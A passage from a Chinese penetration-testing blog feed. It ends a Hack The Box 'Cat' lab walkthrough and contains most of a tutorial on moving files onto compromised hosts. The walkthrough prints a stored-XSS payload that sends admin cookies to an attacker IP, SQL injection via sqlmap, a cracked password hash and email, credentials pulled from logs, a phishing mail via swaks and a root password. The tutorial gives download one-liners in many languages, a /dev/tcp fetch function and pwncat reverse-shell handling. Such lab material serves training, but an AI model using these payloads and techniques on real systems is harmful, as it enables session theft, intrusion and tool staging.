class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if the user is logged in</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] !== <span class="string">&#x27;axel&#x27;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /join.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get the cat_id from the URL</span></span><br><span class="line"><span class="variable">$cat_id</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cat_id&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;cat_id&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cat_id</span>) &#123;</span><br><span class="line">    <span class="comment">// Prepare and execute the query</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT cats.*, users.username FROM cats JOIN users ON cats.owner_username = users.username WHERE cat_id = :cat_id&quot;</span>;</span><br><span class="line">    <span class="variable">$statement</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$query</span>);</span><br><span class="line">    <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:cat_id&#x27;</span>, <span class="variable">$cat_id</span>, PDO::<span class="variable constant_">PARAM_INT</span>);</span><br><span class="line">    <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fetch cat data from the database</span></span><br><span class="line">    <span class="variable">$cat</span> = <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$cat</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Cat not found.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Invalid cat ID.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$cat</span>[<span class="string">&#x27;cat_name&#x27;</span>]); <span class="meta">?&gt;</span> - Cat Details&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/styles.css&quot;</span>&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    .container &#123;</span><br><span class="line">        max-width: <span class="number">800</span>px;</span><br><span class="line">        margin: <span class="number">20</span>px auto;</span><br><span class="line">        padding: <span class="number">20</span>px;</span><br><span class="line">        background-color: <span class="comment">#f9f9f9;</span></span><br><span class="line">        border-radius: <span class="number">10</span>px;</span><br><span class="line">        box-shadow: <span class="number">0</span> <span class="number">0</span> <span class="number">20</span>px <span class="title function_ invoke__">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    .cat-photo &#123;</span><br><span class="line">        width: <span class="number">100</span>%;</span><br><span class="line">        border-radius: <span class="number">10</span>px;</span><br><span class="line">        margin-bottom: <span class="number">10</span>px;</span><br><span class="line">    &#125;</span><br><span class="line">    .cat-info &#123;</span><br><span class="line">        font-size: <span class="number">18</span>px;</span><br><span class="line">        margin-bottom: <span class="number">10</span>px;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">navbar</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">a</span> <span class="title">href</span>=&quot;/&quot;&gt;<span class="title">Home</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">a</span> <span class="title">href</span>=&quot;/<span class="title">vote</span>.<span class="title">php</span>&quot;&gt;<span class="title">Vote</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">a</span> <span class="title">href</span>=&quot;/<span class="title">contest</span>.<span class="title">php</span>&quot;&gt;<span class="title">Contest</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">        <span class="title">if</span> (<span class="title">isset</span>($<span class="title">_SESSION</span>[&#x27;<span class="title">username</span>&#x27;])) </span>&#123;</span><br><span class="line">            <span class="comment">// If user is logged in</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;axel&#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">// If the logged in user is admin</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;/admin.php&quot;&gt;Admin&lt;/a&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;/logout.php&quot;&gt;Logout&lt;/a&gt;&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// If no user is logged in</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;/join.php&quot;&gt;Join&lt;/a&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h1</span>&gt;<span class="title">Cat</span> <span class="title">Details</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">cat</span>[&#x27;<span class="title">cat_name</span>&#x27;]; ?&gt;&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">img</span> <span class="title">src</span>=&quot;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">cat</span>[&#x27;<span class="title">photo_path</span>&#x27;]; ?&gt;&quot; <span class="title">alt</span>=&quot;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">cat</span>[&#x27;<span class="title">cat_name</span>&#x27;]; ?&gt;&quot; <span class="title">class</span>=&quot;<span class="title">cat</span>-<span class="title">photo</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">cat</span>-<span class="title">info</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">strong</span>&gt;<span class="title">Name</span>:&lt;/<span class="title">strong</span>&gt; &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">cat</span>[&#x27;<span class="title">cat_name</span>&#x27;]; ?&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">strong</span>&gt;<span class="title">Age</span>:&lt;/<span class="title">strong</span>&gt; &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">cat</span>[&#x27;<span class="title">age</span>&#x27;]; ?&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">strong</span>&gt;<span class="title">Birthdate</span>:&lt;/<span class="title">strong</span>&gt; &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">cat</span>[&#x27;<span class="title">birthdate</span>&#x27;]; ?&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">strong</span>&gt;<span class="title">Weight</span>:&lt;/<span class="title">strong</span>&gt; &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">cat</span>[&#x27;<span class="title">weight</span>&#x27;]; ?&gt; <span class="title">kg</span>&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">strong</span>&gt;<span class="title">Owner</span>:&lt;/<span class="title">strong</span>&gt; &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">cat</span>[&#x27;<span class="title">username</span>&#x27;]; ?&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">strong</span>&gt;<span class="title">Created</span> <span class="title">At</span>:&lt;/<span class="title">strong</span>&gt; &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">cat</span>[&#x27;<span class="title">created_at</span>&#x27;]; ?&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在 view_cat.php文件中存在直接输出用户的输入，所以我们要在注册的时候将用户名改成</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="variable language_">this</span>.<span class="property">src</span>=<span class="string">&quot;http://10.10.16.8/?ocean=&quot;</span>+<span class="built_in">encodeURIComponent</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)&gt;</span><br></pre></td></tr></table></figure><p>等待管理员访问，然后监听80端口获取cookie</p><img src="/post/4da1391d/IMAGE20250215214158441.png" class=""><p>然后替换管理员cookie登录即可。不过进入后台发现也没有什么可以利用的点继续去看看代码有其他的漏洞吗</p><h3 id="sql注入">sql注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;axel&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;catId&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;catName&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$cat_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;catName&#x27;</span>];</span><br><span class="line">            <span class="variable">$catId</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;catId&#x27;</span>];</span><br><span class="line">            <span class="variable">$sql_insert</span> = <span class="string">&quot;INSERT INTO accepted_cats (name) VALUES (&#x27;<span class="subst">$cat_name</span>&#x27;)&quot;</span>;</span><br><span class="line">            <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$sql_insert</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$stmt_delete</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;DELETE FROM cats WHERE cat_id = :cat_id&quot;</span>);</span><br><span class="line">            <span class="variable">$stmt_delete</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:cat_id&#x27;</span>, <span class="variable">$catId</span>, PDO::<span class="variable constant_">PARAM_INT</span>);</span><br><span class="line">            <span class="variable">$stmt_delete</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;The cat has been accepted and added successfully.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Error: Cat ID or Cat Name not provided.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Access denied.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在accept_cat.php文件中存在sql注入在insert语句cat_name可控并且没用使用预编译语句,所以用sqlmap跑一下</p><p><code>sqlmap -r 1.post --risk 3 --level 5 --batch --dbms sqlite</code></p><p>这里sqlite数据库在配置文件中有提现</p><img src="/post/4da1391d/IMAGE20250215220402069.png" class=""><p>继续盲注得到用户密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rosamendoza485@gmail.com      ac369922d560f17d6eeb8b2c7dec498c</span><br></pre></td></tr></table></figure><p>拿去破解下这个密码</p><img src="/post/4da1391d/IMAGE20250215220738644.png" class=""><p>然后使用rosa用户登录,但是发现并没有用户的flag。</p><img src="/post/4da1391d/IMAGE20250215221029523.png" class=""><p>发现还有几个用户，考虑提权</p><h2 id="提权">提权</h2><img src="/post/4da1391d/IMAGE20250215221247151.png" class=""><p>看了下端口发现3000存在服务转发一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 3000:127.0.0.1:3000 rosa@cat.htb</span><br></pre></td></tr></table></figure><img src="/post/4da1391d/IMAGE20250215221510944.png" class=""><p>去找一下exp</p><p><a href="https://www.exploit-db.com/exploits/52077">https://www.exploit-db.com/exploits/52077</a> 存在xss，但是这里要求登录才能继续利用该漏洞</p><p>那么我们继续返回shell中去找找其他用户有没有泄漏的密码啥的</p><img src="/post/4da1391d/IMAGE20250215222258084.png" class=""><p>看apache的日志找到另一个用户的密码</p><img src="/post/4da1391d/IMAGE20250215222419853.png" class=""><p>拿到flag，然后继续利用刚才的漏洞看看能否提权</p><img src="/post/4da1391d/IMAGE20250215222520328.png" class=""><p>登录进来之后，新建一个respo然后在描述信息里加上payload</p><img src="/post/4da1391d/IMAGE20250215223722094.png" class=""><p>至于为什么我也看的别的师傅的博客是在邮件里有一段描述</p><img src="/post/4da1391d/IMAGE20250215223110284.png" class=""><p>然后发送邮件给jobert 坚听端口获得 信息,这里需要也把邮件的端口转发出来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swaks --to &quot;jobert@localhost&quot; --from &quot;axel@localhost&quot; --header &quot;Click&quot; --body &quot;http://localhost:3000/axel/test&quot; --server localhost</span><br></pre></td></tr></table></figure><p>然后得到密码IKw75eR0MR7CMIxhH0 直接su得到root权限之后拿到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;信息收集&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;nmap -sC -sV -T4 -Pn 10.10.11.53&lt;/code&gt;&lt;/p&gt;
&lt;img src=&quot;/post/4da1391d/IMAGE20250215210535347.png&quot; class=&quot;&quot;&gt;
</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透测试" scheme="https://oceanzbz.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="HTB" scheme="https://oceanzbz.github.io/tags/HTB/"/>
    
    <category term="Linux" scheme="https://oceanzbz.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>后渗透文件下载</title>
    <link href="https://oceanzbz.github.io/post/ea95e3ea.html"/>
    <id>https://oceanzbz.github.io/post/ea95e3ea.html</id>
    <published>2025-02-12T08:33:33.000Z</published>
    <updated>2025-03-05T07:24:36.816Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Linux">Linux</h2><h3 id="wget">wget</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://ip:port/文件</span><br></pre></td></tr></table></figure><img src="/post/ea95e3ea/IMAGE20250212163644048.png" class=""><h3 id="curl">curl</h3><p>curl命令除了用于访问网站也可以用于下载文件，用法为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O http://ip:port/文件</span><br></pre></td></tr></table></figure><img src="/post/ea95e3ea/IMAGE20250212163715328.png" class=""><h3 id="php">php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&quot;file_put_contents(&#x27;保存到本地的路径&#x27;, fopen(&#x27;远程文件的URL&#x27;, &#x27;r&#x27;));&quot;</span></span><br></pre></td></tr></table></figure><img src="/post/ea95e3ea/IMAGE20250212164200505.png" class=""><h3 id="python">python</h3><p>如果你拿到shell的是一个python的站，可以用python执行代码实现文件下载：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import urllib.request;urllib.request.urlretrieve(&#x27;远程文件的URL&#x27;, &#x27;保存到本地的路径&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><h3 id="ruby">ruby</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -e <span class="string">&quot;require &#x27;open-uri&#x27;; open(&#x27;远程文件的URL&#x27;) &#123;|f| File.open(&#x27;保存到本地的路径&#x27;, &#x27;wb&#x27;) &#123;|file| file.puts f.read&#125; &#125;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="perl">perl</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&quot;use LWP::Simple; getstore(&#x27;远程文件的URL&#x27;, &#x27;保存到本地的路径&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><h3 id="nc">nc</h3><p>如果想从外网向目标服务器上传数据，首先在vps上开启</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234 &lt; test.txt</span><br></pre></td></tr></table></figure><p>然后在目标服务器上输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc VPS_IP 1234 &gt; test.txt</span><br></pre></td></tr></table></figure><h3 id="自定义Linux函数">自定义Linux函数</h3><p>linux里可以把一些重复使用的命令封装成一个集合,之后可以使用函数名调用，因此我们可以自己写一个download函数，大概原理就是使用/dev/tcp设备文件与服务器建立TCP连接，并发送HTTP请求获取文件内容，最后将文件内容打印到标准输出，最后把输出重定向就可以获得文件了。在命令行输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">function DOWNLOAD() &#123;</span><br><span class="line"></span><br><span class="line">url=$1</span><br><span class="line"></span><br><span class="line">proto=&quot;http://&quot;</span><br><span class="line"></span><br><span class="line">host=$&#123;url/$proto/&#125;</span><br><span class="line"></span><br><span class="line">server=$&#123;host%%/*&#125;</span><br><span class="line"></span><br><span class="line">path=$&#123;host#*/&#125;</span><br><span class="line"></span><br><span class="line">DOC=/$&#123;path// /&#125;</span><br><span class="line"></span><br><span class="line">HOST=$&#123;server/:*/&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">PORT=$&#123;server/*:/&#125;</span><br><span class="line"></span><br><span class="line">[[ -n $&#123;PORT&#125; ]] || PORT=80</span><br><span class="line"></span><br><span class="line">PORT=$(( PORT + 0 ))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">exec 3&lt;&gt;/dev/tcp/$&#123;HOST&#125;/$&#123;PORT&#125;</span><br><span class="line"></span><br><span class="line">echo -en &quot;GET $&#123;DOC&#125; HTTP/1.0\r\nHost: $&#123;HOST&#125;\r\n\r\n&quot; &gt;&amp;3</span><br><span class="line"></span><br><span class="line">while IFS= read -r line ; do</span><br><span class="line"></span><br><span class="line">[[ &quot;$&#123;line&#125;&quot; == $&#x27;\r&#x27; ]] &amp;&amp; break</span><br><span class="line"></span><br><span class="line">done &lt;&amp;3</span><br><span class="line"></span><br><span class="line">nul=&#x27;\0&#x27;</span><br><span class="line"></span><br><span class="line">while IFS= read -d &#x27;&#x27; -r x || &#123; nul=&quot;&quot;; [ -n &quot;$x&quot; ]; &#125;; do</span><br><span class="line"></span><br><span class="line">printf &quot;%s$&#123;nul&#125;&quot; &quot;$&#123;x&#125;&quot;</span><br><span class="line"></span><br><span class="line">done &lt;&amp;3</span><br><span class="line"></span><br><span class="line">exec 3&gt;&amp;-</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接复制粘贴到shell环境中然后接着输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOWNLOAD http://url:port/fscan &gt;fscan</span><br></pre></td></tr></table></figure><h3 id="pwncat">pwncat</h3><p>这个工具也是看的其他师傅博客了解到的工具确实好用我直接复制粘贴了他的</p><p>pwncat是一款功能强大的反向Shell&amp;BindShell处理工具，同时也是一个主要针对Linux系统为测试目标的后渗透漏洞利用开发平台，最近开发者已经加入了对windows系统的支持。</p><p>pwncat可以用于<strong>代替nc进行反弹shell的接收</strong>，pwncat可以拦截与远程shell的原始通信，并允许用户在远程主机上执行自动化操作，包括枚举、植入安装甚至权限升级。同时，pwncat还会自动优化shell，包括但不限于：</p><ul><li>在远程 shell 中禁用历史记录</li><li>规范化 shell 提示符</li><li>寻找有用的二进制文件</li><li>尝试生成一个伪终端（pty）以进行完整的交互式会话</li></ul><p>pwncat官方出了操作文档：<a href="https://pwncat.readthedocs.io/en/latest/commands/download.html">https://pwncat.readthedocs.io/en/latest/commands/download.html</a>，里面介绍了一些插件功能：</p><ul><li>Alias:命令取别名</li><li>Back:从pwncat返回远程shell(按ctrl D可以从远程shell返回pwncat)</li><li>Bind:绑定命令</li><li>Connect:建立 pwncat 会话，实现反向和绑定 shell 的通信通道</li><li>Download:通过利用 gtfobins框架定位受害主机上的文件读取器并通过管道将内容写回来实现文件读取</li><li>Escalate:用于提权</li><li>lcd:更改pwncat实例的本地工作目录</li><li>load:从python包加载自定义pwncat模块</li><li>Listen:创建一个新的后台侦听器以通过反向 shell 负载异步建立会话</li><li>Listeners:管理活动和停止的侦听器</li><li>lpwd:打印当前本地工作目录</li><li>run:访问pwncat模块</li><li>Info:获取指定模块的文档/帮助信息</li><li>Search:搜索模块</li><li>Use:进入模块的上下文</li><li>Upload:通过gtfobins模块枚举远程主机上可打印或者可写二进制数据的本地文件以实现文件的上传，好处是上传通过与shell相同的连接进行，不需要格外的连接。</li></ul><p>因此pwncat里有现成的文件上传插件以及一堆其他好用的功能，用于代替nc接收反弹的shell非常方便</p><p>下载路径：<a href="https://github.com/calebstewart/pwncat">https://github.com/calebstewart/pwncat</a></p><p>安装</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwncat-cs</span><br></pre></td></tr></table></figure><p>然后在终端输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn-cs -lp  1234 </span><br></pre></td></tr></table></figure><img src="/post/ea95e3ea/IMAGE20250212165201809.png" class=""><p>这样就可以监听了，然后收到shell之后会进入到pwncat终端模式这时候想要回到shell模式只需输入back就行</p><img src="/post/ea95e3ea/IMAGE20250212165536294.png" class=""><p>按ctrl D可以从远程shell返回pwncat，下面就来试试如何下载一个文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download /root/s.sh ./sh</span><br></pre></td></tr></table></figure><img src="/post/ea95e3ea/IMAGE20250212165913781.png" class=""><p>上传一个文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload ./s.sh /root/s.sh</span><br></pre></td></tr></table></figure><img src="/post/ea95e3ea/IMAGE20250212170052873.png" class=""><h3 id="msf">msf</h3><p>msf 获取shell之后可以上传和下载文件参考<br><a href="https://blog.csdn.net/weixin_43847838/article/details/127623761">https://blog.csdn.net/weixin_43847838/article/details/127623761</a></p><h2 id="windows">windows</h2><h3 id="powershell">powershell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span> = <span class="built_in">new-object</span> system.net.webclient  <span class="variable">$p</span>.downloadfile(<span class="string">&quot;http://xx.xx.xx.xx\file&quot;</span>,<span class="string">&quot;c:\xxx\xx\file&quot;</span>)|</span><br></pre></td></tr></table></figure><h3 id="vbs">vbs</h3><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> args = Wscript.Arguments  </span><br><span class="line">Url = <span class="string">&quot;http://192.168.43.68:8000/1.py&quot;</span>  </span><br><span class="line"><span class="keyword">dim</span> xHttp: <span class="keyword">Set</span> xHttp = createobject(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>)  </span><br><span class="line"><span class="keyword">dim</span> bStrm: <span class="keyword">Set</span> bStrm = createobject(<span class="string">&quot;Adodb.Stream&quot;</span>)  </span><br><span class="line">xHttp.Open <span class="string">&quot;GET&quot;</span>, Url, <span class="literal">False</span>  </span><br><span class="line">xHttp.Send  </span><br><span class="line"><span class="keyword">with</span> bStrm  </span><br><span class="line">    .type = <span class="number">1</span> <span class="comment">&#x27;  </span></span><br><span class="line">    .open  </span><br><span class="line">    .write xHttp.responseBody  </span><br><span class="line">    .savetofile <span class="string">&quot; C:\users\pino\file\1.py&quot;</span>, <span class="number">2</span> <span 